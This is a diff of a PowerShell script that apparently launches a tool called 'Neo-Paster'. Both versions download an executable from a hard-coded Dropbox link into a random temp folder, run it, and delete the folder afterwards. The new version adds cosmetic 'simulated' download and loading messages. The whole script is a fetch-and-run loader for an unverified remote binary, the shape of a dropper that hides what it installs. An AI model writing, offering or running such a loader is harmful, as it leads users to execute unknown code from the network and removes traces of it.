@@ -1,39 +1,32 @@
-$url = "https://www.dropbox.com/scl/fi/pywkslydef69f64ga6ukp/neopaster.exe?rlkey=yjfxi2hibb9bmdhe7acs94yu2&st=4xf7ng1c&dl=1"
-$tempdir = "$env:TEMP\$(New-Guid)"
-$file = "$tempdir\app.exe"
+$url = "https://www.dropbox.com/scl/fi/pywkslydef69f64ga6ukp/neopaster.exe?rlkey=yjfxi2hibb9bmdhe7acs94yu2&st=4xf7ng1c&dl=1"  
+$tempdir = "$env:TEMP\$(New-Guid)" 
+mkdir $tempdir | Out-Null
+$file = "$tempdir\app.exe" 
+
+# Simulate download start
+Write-Host "Download started..." -ForegroundColor Cyan
+Start-Sleep -Seconds 1  # Simulate the downloading animation
 
 try {
-    # Create temp directory
-    mkdir $tempdir -Force | Out-Null
+    # Download the file
+    irm -Uri $url -OutFile $file -ErrorAction Stop
+    Write-Host "Download complete!" -ForegroundColor Green
+    Start-Sleep -Seconds 1  # Pause to simulate download completion
 
-    # Start progress display
-    $job = Start-Job -ScriptBlock {
-        $i = 0
-        while ($true) {
-            Write-Progress -Activity "Downloading File" -Status "Progress" -PercentComplete (($i++ % 100))
-            Start-Sleep -Milliseconds 100
-        }
-    }
+    # Neo-Paster loading animation
+    Write-Host "Neo-Paster is loading..." -ForegroundColor Yellow
+    Start-Sleep -Seconds 2  # Simulate loading time
 
-    # Download with suppressed output
-    $ProgressPreference = 'SilentlyContinue'
-    Invoke-RestMethod -Uri $url -OutFile $file -ErrorAction Stop *>&1 | Out-Null
+    # Start the process (Neo-Paster)
+    $proc = Start-Process $file -PassThru -Wait 
+    Write-Host "Process exited with code: $($proc.ExitCode)" -ForegroundColor Green
 
-    # Stop progress display
-    $job | Stop-Job -PassThru | Remove-Job -Force
-    Write-Progress -Completed -Activity "Downloading File"
-
-    # Execute file
-    Write-Host "Launching application..." -ForegroundColor Yellow
-    $proc = Start-Process $file -PassThru -Wait
-    Write-Host "Exit code: $($proc.ExitCode)" -ForegroundColor Cyan
-
-}
-catch {
-    Write-Error "ERROR: $_"
-}
-finally {
-    # Cleanup
-    Remove-Item $tempdir -Recurse -Force -ErrorAction SilentlyContinue
-    Write-Host "Cleanup completed" -ForegroundColor DarkGray
+} catch {
+    Write-Error "An error occurred: $_" -ForegroundColor Red
+} finally {
+    # Simulate cleanup process
+    Write-Host "Cleaning up temporary files..." -ForegroundColor Magenta
+    Start-Sleep -Seconds 1  # Simulate cleanup process
+    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue  
+    Write-Host "Temporary files removed. Have a nice day!" -ForegroundColor Blue
 }
